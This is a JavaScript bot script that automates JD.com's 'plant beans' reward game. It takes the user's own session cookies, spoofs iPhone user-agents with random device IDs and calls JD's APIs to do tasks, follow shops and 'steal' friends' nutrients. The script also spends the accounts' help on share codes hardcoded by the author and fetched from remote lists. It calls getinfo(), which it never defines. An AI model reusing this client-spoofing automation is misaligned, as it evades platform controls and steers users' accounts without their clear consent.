/*
种豆得豆 脚本更新地址：https://raw.githubusercontent.com/Aaron-lv/sync/jd_scripts/jd_plantBean.js
更新时间：2021-04-9
活动入口：京东APP我的-更多工具-种豆得豆
已支持IOS京东多账号,云端多京东账号
脚本兼容: QuantumultX, Surge, Loon, JSBox, Node.js
注：会自动关注任务中的店铺跟商品，介意者勿使用。
互助码shareCode请先手动运行脚本查看打印可看到
每个京东账号每天只能帮助3个人。多出的助力码将会助力失败。
=====================================Quantumult X=================================
[task_local]
1 7-21/2 * * * https://raw.githubusercontent.com/Aaron-lv/sync/jd_scripts/jd_plantBean.js, tag=种豆得豆, img-url=https://raw.githubusercontent.com/58xinian/icon/master/jdzd.png, enabled=true
=====================================Loon================================
[Script]
cron "1 7-21/2 * * *" script-path=https://raw.githubusercontent.com/Aaron-lv/sync/jd_scripts/jd_plantBean.js,tag=京东种豆得豆
======================================Surge==========================
京东种豆得豆 = type=cron,cronexp="1 7-21/2 * * *",wake-system=1,timeout=3600,script-path=https://raw.githubusercontent.com/Aaron-lv/sync/jd_scripts/jd_plantBean.js
====================================小火箭=============================
京东种豆得豆 = type=cron,script-path=https://raw.githubusercontent.com/Aaron-lv/sync/jd_scripts/jd_plantBean.js, cronexpr="1 7-21/2 * * *", timeout=3600, enable=true
*/
const $ = new Env('京东种豆得豆');
//Node.js用户请在jdCookie.js处填写京东ck;
//ios等软件用户直接用NobyDa的jd cookie
let jdNotify = true;//是否开启静默运行。默认true开启
let cookiesArr = [], cookie = '', jdPlantBeanShareArr = [], isBox = false, notify, newShareCodes, option, message,subTitle;
//京东接口地址
const JD_API_HOST = 'https://api.m.jd.com/client.action';
//助力好友分享码(最多3个,否则后面的助力失败)
//此此内容是IOS用户下载脚本到本地使用，填写互助码的地方，同一京东账号的好友互助码请使用@符号隔开。
//下面给出两个账号的填写示例（iOS只支持2个京东账号）
let shareCodes = [ // IOS本地脚本用户这个列表填入你要助力的好友的shareCode
                   //账号一的好友shareCode,不同好友的shareCode中间用@符号隔开
  '3xd6hi7wz3detzueuft3fjnaq6shonvreqhvugy@nkvdrkoit5o65hgsezt2hkynoeq3olf63v6icua@fb227jqogvovf4dzt65kyksuqq3h7wlwy7o5jii@2glpkm3dt2ujt5eufktgoxeewa5ac3f4ijdgqji@anvpoh7gttncs535ikqc3dfbbsnst3auzw6gmjq@e7lhibzb3zek3l2je2y7rjczlz3sq4c6e2r72di@mlrdw3aw26j3xrwlavyve554fsprq7lxnn2esoa@7ii2tqua5cw4cuvznmvewfo7gbrfz5c4dyurxen5sazkv5ctbrdq',
  //账号二的好友shareCode,不同好友的shareCode中间用@符号隔开
  '3xd6hi7wz3detzueuft3fjnaq6shonvreqhvugy@nkvdrkoit5o65hgsezt2hkynoeq3olf63v6icua@fb227jqogvovf4dzt65kyksuqq3h7wlwy7o5jii@2glpkm3dt2ujt5eufktgoxeewa5ac3f4ijdgqji@anvpoh7gttncs535ikqc3dfbbsnst3auzw6gmjq@e7lhibzb3zek3l2je2y7rjczlz3sq4c6e2r72di@mlrdw3aw26j3xrwlavyve554fsprq7lxnn2esoa@7ii2tqua5cw4cuvznmvewfo7gbrfz5c4dyurxen5sazkv5ctbrdq',
]
let allMessage = ``;
let currentRoundId = null;//本期活动id
let lastRoundId = null;//上期id
let roundList = [];
let awardState = '';//上期活动的京豆是否收取
let num;
let helpAuthor = true;
!(async () => {
  await requireConfig();
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      await TotalBean();
      console.log(`\n开始【京东账号${$.index}】${$.nickName || $.UserName}\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      message = '';
      subTitle = '';
      option = {};
      await getUA()
      await getinfo()
      await shareCodesFormat();
      await jdPlantBean();
      await showMsg();
    }
  }
  if ($.isNode() && allMessage) {
    await notify.sendNotify(`${$.name}`, `${allMessage}`)
  }
})().catch((e) => {
  $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
}).finally(() => {
  $.done();
})

async function jdPlantBean() {
  try {
    console.log(`获取任务及基本信息`)
    await plantBeanIndex();
    if ($.plantBeanIndexResult.errorCode === 'PB101') {
      console.log(`\n活动太火爆了，还是去买买买吧！\n`)
      return
    }
    for (let i = 0; i < $.plantBeanIndexResult.data.roundList.length; i++) {
      if ($.plantBeanIndexResult.data.roundList[i].roundState === "2") {
        num = i
        break
      }
    }
    // console.log(plantBeanIndexResult.data.taskList);
    if ($.plantBeanIndexResult && $.plantBeanIndexResult.code === '0' && $.plantBeanIndexResult.data) {
      const shareUrl = $.plantBeanIndexResult.data.jwordShareInfo.shareUrl
      $.myPlantUuid = getParam(shareUrl, 'plantUuid')
      console.log(`\n【京东账号${$.index}（${$.UserName}）的${$.name}好友互助码】${$.myPlantUuid}\n`);
      roundList = $.plantBeanIndexResult.data.roundList;
      currentRoundId = roundList[num].roundId;//本期的roundId
      lastRoundId = roundList[num - 1].roundId;//上期的roundId
      awardState = roundList[num - 1].awardState;
      $.taskList = $.plantBeanIndexResult.data.taskList;
      subTitle = `【京东昵称】${$.plantBeanIndexResult.data.plantUserInfo.plantNickName}`;
      message += `【上期时间】${roundList[num - 1].dateDesc.replace('上期 ', '')}\n`;
      message += `【上期成长值】${roundList[num - 1].growth}\n`;
      await receiveNutrients();//定时领取营养液
      await doHelp();//助力
      await doTask();//做日常任务
      //await doEgg();
      await stealFriendWater();
      await doCultureBean();
      await doGetReward();
      await showTaskProcess();
      await plantShareSupportList();
    } else {
      console.log(`种豆得豆-初始失败:  ${JSON.stringify($.plantBeanIndexResult)}`);
    }
  } catch (e) {
    $.logErr(e);
    const errMsg = `京东账号${$.index} ${$.nickName || $.UserName}\n任务执行异常，请检查执行日志 ‼️‼️`;
    $.msg($.name, '', `京东账号${$.index} ${$.nickName || $.UserName}\n${errMsg}`)
  }
}
async function doGetReward() {
  console.log(`【上轮京豆】${awardState === '4' ? '采摘中' : awardState === '5' ? '可收获了' : '已领取'}`);
  if (awardState === '4') {
    //京豆采摘中...
    message += `【上期状态】${roundList[num - 1].tipBeanEndTitle}\n`;
  } else if (awardState === '5') {
    //收获
    await getReward();
    console.log('开始领取京豆');
    if ($.getReward && $.getReward.code === '0') {
      console.log('京豆领取成功');
      message += `【上期兑换京豆】${$.getReward.data.awardBean}个\n`;
      $.msg($.name, subTitle, message);
      allMessage += `京东账号${$.index} ${$.nickName}\n${message}${$.index !== cookiesArr.length ? '\n\n' : ''}`
      // if ($.isNode()) {
      //   await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName || $.UserName}`, `京东账号${$.index} ${$.nickName}\n${message}`);
      // }
    } else {
      console.log(`$.getReward 异常：${JSON.stringify($.getReward)}`)
    }
  } else if (awardState === '6') {
    //京豆已领取
    message += `【上期兑换京豆】${roundList[num - 1].awardBeans}个\n`;
  }
  if (roundList[1].dateDesc.indexOf('本期 ') > -1) {
    roundList[1].dateDesc = roundList[1].dateDesc.substr(roundList[1].dateDesc.indexOf('本期 ') + 3, roundList[1].dateDesc.length);
  }
  message += `【本期时间】${roundList[num].dateDesc}\n`;
  message += `【本期成长值】${roundList[num].growth}\n`;
}
async function doCultureBean() {
  await plantBeanIndex();
  if ($.plantBeanIndexResult && $.plantBeanIndexResult.code === '0') {
    const plantBeanRound = $.plantBeanIndexResult.data.roundList[num]
    if (plantBeanRound.roundState === '2') {
      //收取营养液
      if (plantBeanRound.bubbleInfos && plantBeanRound.bubbleInfos.length) console.log(`开始收取营养液`)
      for (let bubbleInfo of plantBeanRound.bubbleInfos) {
        console.log(`收取-${bubbleInfo.name}-的营养液`)
        await cultureBean(plantBeanRound.roundId, bubbleInfo.nutrientsType)
        console.log(`收取营养液结果:${JSON.stringify($.cultureBeanRes)}`)
      }
    }
  } else {
    console.log(`plantBeanIndexResult:${JSON.stringify($.plantBeanIndexResult)}`)
  }
}
async function stealFriendWater() {
  await stealFriendList();
  if ($.stealFriendList && $.stealFriendList.code === '0') {
    if ($.stealFriendList.data && $.stealFriendList.data.tips) {
      console.log('\n\n今日偷取好友营养液已达上限\n\n');
      return
    }
    if ($.stealFriendList.data && $.stealFriendList.data.friendInfoList && $.stealFriendList.data.friendInfoList.length > 0) {
      let nowTimes = new Date(new Date().getTime() + new Date().getTimezoneOffset()*60*1000 + 8*60*60*1000);
      for (let item of $.stealFriendList.data.friendInfoList) {
        if (new Date(nowTimes).getHours() === 20) {
          if (item.nutrCount >= 2) {
            // console.log(`可以偷的好友的信息::${JSON.stringify(item)}`);
            console.log(`可以偷的好友的信息paradiseUuid::${JSON.stringify(item.paradiseUuid)}`);
            await collectUserNutr(item.paradiseUuid);
            console.log(`偷取好友营养液情况:${JSON.stringify($.stealFriendRes)}`)
            if ($.stealFriendRes && $.stealFriendRes.code === '0') {
              console.log(`偷取好友营养液成功`)
            }
          }
        } else {
          if (item.nutrCount >= 3) {
            // console.log(`可以偷的好友的信息::${JSON.stringify(item)}`);
            console.log(`可以偷的好友的信息paradiseUuid::${JSON.stringify(item.paradiseUuid)}`);
            await collectUserNutr(item.paradiseUuid);
            console.log(`偷取好友营养液情况:${JSON.stringify($.stealFriendRes)}`)
            if ($.stealFriendRes && $.stealFriendRes.code === '0') {
              console.log(`偷取好友营养液成功`)
            }
          }
        }
      }
    }
  } else {
    console.log(`$.stealFriendList 异常： ${JSON.stringify($.stealFriendList)}`)
  }
}
async function doEgg() {
  await egg();
  if ($.plantEggLotteryRes && $.plantEggLotteryRes.code === '0') {
    if ($.plantEggLotteryRes.data.restLotteryNum > 0) {
      const eggL = new Array($.plantEggLotteryRes.data.restLotteryNum).fill('');
      console.log(`目前共有${eggL.length}次扭蛋的机会`)
      for (let i = 0; i < eggL.length; i++) {
        console.log(`开始第${i + 1}次扭蛋`);
        await plantEggDoLottery();
        console.log(`天天扭蛋成功：${JSON.stringify($.plantEggDoLotteryResult)}`);
      }
    } else {
      console.log('暂无扭蛋机会')
    }
  } else {
    console.log('查询天天扭蛋的机会失败' + JSON.stringify($.plantEggLotteryRes))
  }
}
async function doTask() {
  if ($.taskList && $.taskList.length > 0) {
    for (let item of $.taskList) {
      if (item.isFinished === 1) {
        console.log(`${item.taskName} 任务已完成\n`);
        continue;
      } else {
        if (item.taskType === 8) {
          console.log(`\n【${item.taskName}】任务未完成,需自行手动去京东APP完成，${item.desc}营养液\n`)
        } else {
          console.log(`\n【${item.taskName}】任务未完成,${item.desc}营养液\n`)
        }
      }
      if (item.dailyTimes === 1 && item.taskType !== 8) {
        console.log(`\n开始做 ${item.taskName}任务`);
        // $.receiveNutrientsTaskRes = await receiveNutrientsTask(item.taskType);
        await receiveNutrientsTask(item.taskType);
        console.log(`做 ${item.taskName}任务结果:${JSON.stringify($.receiveNutrientsTaskRes)}\n`);
      }
      if (item.taskType === 3) {
        //浏览店铺
        console.log(`开始做 ${item.taskName}任务`);
        let unFinishedShopNum = item.totalNum - item.gainedNum;
        if (unFinishedShopNum === 0) {
          continue
        }
        await shopTaskList();
        const { data } = $.shopTaskListRes;
        let goodShopListARR = [], moreShopListARR = [], shopList = [];
        const { goodShopList, moreShopList } = data;
        for (let i of goodShopList) {
          if (i.taskState === '2') {
            goodShopListARR.push(i);
          }
        }
        for (let j of moreShopList) {
          if (j.taskState === '2') {
            moreShopListARR.push(j);
          }
        }
        shopList = goodShopListARR.concat(moreShopListARR);
        for (let shop of shopList) {
          const { shopId, shopTaskId } = shop;
          const body = {
            "monitor_refer": "plant_shopNutrientsTask",
            "shopId": shopId,
            "shopTaskId": shopTaskId
          }
          const shopRes = await requestGet('shopNutrientsTask', body);
          console.log(`shopRes结果:${JSON.stringify(shopRes)}`);
          if (shopRes && shopRes.code === '0') {
            if (shopRes.data && shopRes.data.nutrState && shopRes.data.nutrState === '1') {
              unFinishedShopNum --;
            }
          }
          if (unFinishedShopNum <= 0) {
            console.log(`${item.taskName}任务已做完\n`)
            break;
          }
        }
      }
      if (item.taskType === 5) {
        //挑选商品
        console.log(`开始做 ${item.taskName}任务`);
        let unFinishedProductNum = item.totalNum - item.gainedNum;
        if (unFinishedProductNum === 0) {
          continue
        }
        await productTaskList();
        // console.log('productTaskList', $.productTaskList);
        const { data } = $.productTaskList;
        let productListARR = [], productList = [];
        const { productInfoList } = data;
        for (let i = 0; i < productInfoList.length; i++) {
          for (let j = 0; j < productInfoList[i].length; j++){
            productListARR.push(productInfoList[i][j]);
          }
        }
        for (let i of productListARR) {
          if (i.taskState === '2') {
            productList.push(i);
          }
        }
        for (let product of productList) {
          const { skuId, productTaskId } = product;
          const body = {
            "monitor_refer": "plant_productNutrientsTask",
            "productTaskId": productTaskId,
            "skuId": skuId
          }
          const productRes = await requestGet('productNutrientsTask', body);
          if (productRes && productRes.code === '0') {
            // console.log('nutrState', productRes)
            //这里添加多重判断,有时候会出现活动太火爆的问题,导致nutrState没有
            if (productRes.data && productRes.data.nutrState && productRes.data.nutrState === '1') {
              unFinishedProductNum --;
            }
          }
          if (unFinishedProductNum <= 0) {
            console.log(`${item.taskName}任务已做完\n`)
            break;
          }
        }
      }
      if (item.taskType === 10) {
        //关注频道
        console.log(`开始做 ${item.taskName}任务`);
        let unFinishedChannelNum = item.totalNum - item.gainedNum;
        if (unFinishedChannelNum === 0) {
          continue
        }
        await plantChannelTaskList();
        const { data } = $.plantChannelTaskList;
        // console.log('goodShopList', data.goodShopList);
        // console.log('moreShopList', data.moreShopList);
        let goodChannelListARR = [], normalChannelListARR = [], channelList = [];
        const { goodChannelList, normalChannelList } = data;
        for (let i of goodChannelList) {
          if (i.taskState === '2') {
            goodChannelListARR.push(i);
          }
        }
        for (let j of normalChannelList) {
          if (j.taskState === '2') {
            normalChannelListARR.push(j);
          }
        }
        channelList = goodChannelListARR.concat(normalChannelListARR);
        for (let channelItem of channelList) {
          const { channelId, channelTaskId } = channelItem;
          const body = {
            "channelId": channelId,
            "channelTaskId": channelTaskId
          }
          const channelRes = await requestGet('plantChannelNutrientsTask', body);
          console.log(`channelRes结果:${JSON.stringify(channelRes)}`);
          if (channelRes && channelRes.code === '0') {
            if (channelRes.data && channelRes.data.nutrState && channelRes.data.nutrState === '1') {
              unFinishedChannelNum --;
            }
          }
          if (unFinishedChannelNum <= 0) {
            console.log(`${item.taskName}任务已做完\n`)
            break;
          }
        }
      }
    }
  }
}
function showTaskProcess() {
  return new Promise(async resolve => {
    await plantBeanIndex();
    $.taskList = $.plantBeanIndexResult.data.taskList;
    if ($.taskList && $.taskList.length > 0) {
      console.log("     任务   进度");
      for (let item of $.taskList) {
        console.log(`[${item["taskName"]}]  ${item["gainedNum"]}/${item["totalNum"]}   ${item["isFinished"]}`);
      }
    }
    resolve()
  })
}
//助力好友
async function doHelp() {
  for (let plantUuid of newShareCodes) {
    console.log(`开始助力京东账号${$.index} - ${$.nickName}的好友: ${plantUuid}`);
    if (!plantUuid) continue;
    if (plantUuid === $.myPlantUuid) {
      console.log(`\n跳过自己的plantUuid\n`)
      continue
    }
    await helpShare(plantUuid);
    if ($.helpResult && $.helpResult.code === '0') {
      // console.log(`助力好友结果: ${JSON.stringify($.helpResult.data.helpShareRes)}`);
      if ($.helpResult.data.helpShareRes) {
        if ($.helpResult.data.helpShareRes.state === '1') {
          console.log(`助力好友${plantUuid}成功`)
          console.log(`${$.helpResult.data.helpShareRes.promptText}\n`);
        } else if ($.helpResult.data.helpShareRes.state === '2') {
          console.log('您今日助力的机会已耗尽，已不能再帮助好友助力了\n');
          break;
        } else if ($.helpResult.data.helpShareRes.state === '3') {
          console.log('该好友今日已满9人助力/20瓶营养液,明天再来为Ta助力吧\n')
        } else if ($.helpResult.data.helpShareRes.state === '4') {
          console.log(`${$.helpResult.data.helpShareRes.promptText}\n`)
        } else {
          console.log(`助力其他情况：${JSON.stringify($.helpResult.data.helpShareRes)}`);
        }
      }
    } else {
      console.log(`助力好友失败: ${JSON.stringify($.helpResult)}`);
    }
  }
}
function showMsg() {
  $.log(`\n${message}\n`);
  jdNotify = $.getdata('jdPlantBeanNotify') ? $.getdata('jdPlantBeanNotify') : jdNotify;
  if (!jdNotify || jdNotify === 'false') {
    $.msg($.name, subTitle, message);
  }
}
// ================================================此处是API=================================
//每轮种豆活动获取结束后,自动收取京豆
async function getReward() {
  const body = {
    "roundId": lastRoundId
  }
  $.getReward = await request('receivedBean', body);
}
//收取营养液
async function cultureBean(currentRoundId, nutrientsType) {
  let functionId = arguments.callee.name.toString();
  let body = {
    "roundId": currentRoundId,
    "nutrientsType": nutrientsType,
  }
  $.cultureBeanRes = await request(functionId, body);
}
//偷营养液大于等于3瓶的好友
//①查询好友列表
async function stealFriendList() {
  const body = {
    pageNum: '1'
  }
  $.stealFriendList = await request('plantFriendList', body);
}

//②执行偷好友营养液的动作
async function collectUserNutr(paradiseUuid) {
  console.log('开始偷好友');
  // console.log(paradiseUuid);
  let functionId = arguments.callee.name.toString();
  const body = {
    "paradiseUuid": paradiseUuid,
    "roundId": currentRoundId
  }
  $.stealFriendRes = await request(functionId, body);
}
async function receiveNutrients() {
  $.receiveNutrientsRes = await request('receiveNutrients', {"roundId": currentRoundId, "monitor_refer": "plant_receiveNutrients"})
  // console.log(`定时领取营养液结果:${JSON.stringify($.receiveNutrientsRes)}`)
}
async function plantEggDoLottery() {
  $.plantEggDoLotteryResult = await requestGet('plantEggDoLottery');
}
//查询天天扭蛋的机会
async function egg() {
  $.plantEggLotteryRes = await requestGet('plantEggLotteryIndex');
}
async function productTaskList() {
  let functionId = arguments.callee.name.toString();
  $.productTaskList = await requestGet(functionId, {"monitor_refer": "plant_productTaskList"});
}
async function plantChannelTaskList() {
  let functionId = arguments.callee.name.toString();
  $.plantChannelTaskList = await requestGet(functionId);
  // console.log('$.plantChannelTaskList', $.plantChannelTaskList)
}
async function shopTaskList() {
  let functionId = arguments.callee.name.toString();
  $.shopTaskListRes = await requestGet(functionId, {"monitor_refer": "plant_receiveNutrients"});
  // console.log('$.shopTaskListRes', $.shopTaskListRes)
}
async function receiveNutrientsTask(awardType) {
  const functionId = arguments.callee.name.toString();
  const body = {
    "monitor_refer": "receiveNutrientsTask",
    "awardType": `${awardType}`,
  }
  $.receiveNutrientsTaskRes = await requestGet(functionId, body);
}
async function plantShareSupportList() {
  $.shareSupportList = await requestGet('plantShareSupportList', {"roundId": ""});
  if ($.shareSupportList && $.shareSupportList.code === '0') {
    const { data } = $.shareSupportList;
    //当日北京时间0点时间戳
    const UTC8_Zero_Time = parseInt((Date.now() + 28800000) / 86400000) * 86400000 - 28800000;
    //次日北京时间0点时间戳
    const UTC8_End_Time = parseInt((Date.now() + 28800000) / 86400000) * 86400000 - 28800000 + (24 * 60 * 60 * 1000);
    let friendList = [];
    data.map(item => {
      if (UTC8_Zero_Time <= item['createTime'] && item['createTime'] < UTC8_End_Time) {
        friendList.push(item);
      }
    })
    message += `【助力您的好友】共${friendList.length}人`;
  } else {
    console.log(`异常情况：${JSON.stringify($.shareSupportList)}`)
  }
}
//助力好友的api
async function helpShare(plantUuid) {
  console.log(`\n开始助力好友: ${plantUuid}`);
  const body = {
    "plantUuid": plantUuid,
    "wxHeadImgUrl": "",
    "shareUuid": "",
    "followType": "1",
  }
  $.helpResult = await request(`plantBeanIndex`, body);
  console.log(`助力结果的code:${$.helpResult && $.helpResult.code}`);
}
async function plantBeanIndex() {
  $.plantBeanIndexResult = await request('plantBeanIndex');//plantBeanIndexBody
}
function readShareCode() {
  console.log(`开始`)
  return new Promise(async resolve => {
    $.get({url: "https://wuzhi03.coding.net/p/dj/d/RandomShareCode/git/raw/main/JD_Plant_Bean.json",headers:{
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      }}, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，将切换为备用API`)
          console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
          $.get({url: `https://raw.githubusercontent.com/shuyeshuye/RandomShareCode/main/JD_Plant_Bean.json`, 'timeout': 10000},(err, resp, data)=>{
          data = JSON.parse(data);})
        } else {
          if (data) {
            console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
            data = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
    await $.wait(15000);
    resolve()
  })
}
//格式化助力码
function shareCodesFormat() {
  return new Promise(async resolve => {
    // console.log(`第${$.index}个京东账号的助力码:::${jdPlantBeanShareArr[$.index - 1]}`)
    newShareCodes = [];
    if (jdPlantBeanShareArr[$.index - 1]) {
      newShareCodes = jdPlantBeanShareArr[$.index - 1].split('@');
    } else {
      console.log(`由于您第${$.index}个京东账号未提供shareCode,将采纳本脚本自带的助力码\n`)
      const tempIndex = $.index > shareCodes.length ? (shareCodes.length - 1) : ($.index - 1);
      newShareCodes = shareCodes[tempIndex].split('@');
    }
    const readShareCodeRes = await readShareCode();
    if (readShareCodeRes && readShareCodeRes.code === 200) {
      newShareCodes = [...new Set([...newShareCodes, ...(readShareCodeRes.data || [])])];
    }
    console.log(`第${$.index}个京东账号将要助力的好友${JSON.stringify(newShareCodes)}`)
    resolve();
  })
}
function requireConfig() {
  return new Promise(resolve => {
    console.log('开始获取种豆得豆配置文件\n')
    notify = $.isNode() ? require('./sendNotify') : '';
    //Node.js用户请在jdCookie.js处填写京东ck;
    const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
    const jdPlantBeanShareCodes = $.isNode() ? require('./jdPlantBeanShareCodes.js') : '';
    //IOS等用户直接用NobyDa的jd cookie
    if ($.isNode()) {
      Object.keys(jdCookieNode).forEach((item) => {
        if (jdCookieNode[item]) {
          cookiesArr.push(jdCookieNode[item])
        }
      })
      if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
    } else {
      cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
    }
    console.log(`共${cookiesArr.length}个京东账号\n`)
    if ($.isNode()) {
      Object.keys(jdPlantBeanShareCodes).forEach((item) => {
        if (jdPlantBeanShareCodes[item]) {
          jdPlantBeanShareArr.push(jdPlantBeanShareCodes[item])
        }
      })
    } else {
      const boxShareCodeArr = ['jd_plantBean1', 'jd_plantBean2', 'jd_plantBean3'];
      const boxShareCodeArr2 = ['jd2_plantBean1', 'jd2_plantBean2', 'jd2_plantBean3'];
      const isBox1 = boxShareCodeArr.some((item) => {
        const boxShareCode = $.getdata(item);
        return (boxShareCode !== undefined && boxShareCode !== null && boxShareCode !== '');
      });
      const isBox2 = boxShareCodeArr2.some((item) => {
        const boxShareCode = $.getdata(item);
        return (boxShareCode !== undefined && boxShareCode !== null && boxShareCode !== '');
      });
      isBox = isBox1 ? isBox1 : isBox2;
      if (isBox1) {
        let temp = [];
        for (const item of boxShareCodeArr) {
          if ($.getdata(item)) {
            temp.push($.getdata(item))
          }
        }
        jdPlantBeanShareArr.push(temp.join('@'));
      }
      if (isBox2) {
        let temp = [];
        for (const item of boxShareCodeArr2) {
          if ($.getdata(item)) {
            temp.push($.getdata(item))
          }
        }
        jdPlantBeanShareArr.push(temp.join('@'));
      }
    }
    // console.log(`\n种豆得豆助力码::${JSON.stringify(jdPlantBeanShareArr)}`);
    console.log(`您提供了${jdPlantBeanShareArr.length}个账号的种豆得豆助力码\n`);
    resolve()
  })
}
function requestGet(function_id, body = {}) {
  if (!body.version) {
    body["version"] = "9.0.0.1";
  }
  body["monitor_source"] = "plant_app_plant_index";
  body["monitor_refer"] = "";
  return new Promise(async resolve => {
    await $.wait(2000);
    const option = {
      url: `${JD_API_HOST}?functionId=${function_id}&body=${escape(JSON.stringify(body))}&appid=ld`,
      headers: {
        'Cookie': cookie,
        'Host': 'api.m.jd.com',
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'User-Agent': 'JD4iPhone/167283 (iPhone;iOS 13.6.1;Scale/3.00)',
        'Accept-Language': 'zh-Hans-CN;q=1,en-CN;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': "application/x-www-form-urlencoded"
      },
      timeout: 10000,
    };
    $.get(option, (err, resp, data) => {
      try {
        if (err) {
          console.log('\n种豆得豆: API查询请求失败 ‼️‼️')
          $.logErr(err);
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
      },
      "timeout": 10000,
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            if (data['retcode'] === 0) {
              $.nickName = (data['base'] && data['base'].nickname) || $.UserName;
            } else {
              $.nickName = $.UserName
            }
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function request(function_id, body = {}){
  return new Promise(async resolve => {
    await $.wait(2000);
    $.post(taskUrl(function_id, body), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n种豆得豆: API查询请求失败 ‼️‼️')
          console.log(`function_id:${function_id}`)
          $.logErr(err);
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function taskUrl(function_id, body) {
  body["version"] = "9.2.4.0";
  body["monitor_source"] = "plant_app_plant_index";
  body["monitor_refer"] = "";
  return {
    url: JD_API_HOST,
    body: `functionId=${function_id}&body=${escape(JSON.stringify(body))}&appid=ld&client=apple&area=19_1601_50258_51885&build=167490&clientVersion=9.3.2`,
    headers: {
      "Cookie": cookie,
      "Host": "api.m.jd.com",
      "Accept": "*/*",
      "Connection": "keep-alive",
      "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
      "Accept-Language": "zh-Hans-CN;q=1,en-CN;q=0.9",
      "Accept-Encoding": "gzip, deflate, br",
      "Content-Type": "application/x-www-form-urlencoded"
    },
    timeout: 10000,
  }
}
function getParam(url, name) {
  const reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i")
  const r = url.match(reg)
  if (r != null) return unescape(r[2]);
  return null;
}
function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
async function getUA(){
  $.UA = `jdapp;iPhone;10.1.4;13.1.2;${randomString(40)};network/wifi;model/iPhone8,1;addressid/2308460611;appBuild/167814;jdSupportDarkMode/0;Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1`
}
function randomString(e) {
  e = e || 32;
  let t = "abcdef0123456789", a = t.length, n = "";
  for (i = 0; i < e; i++)
    n += t.charAt(Math.floor(Math.random() * a));
  return n
}
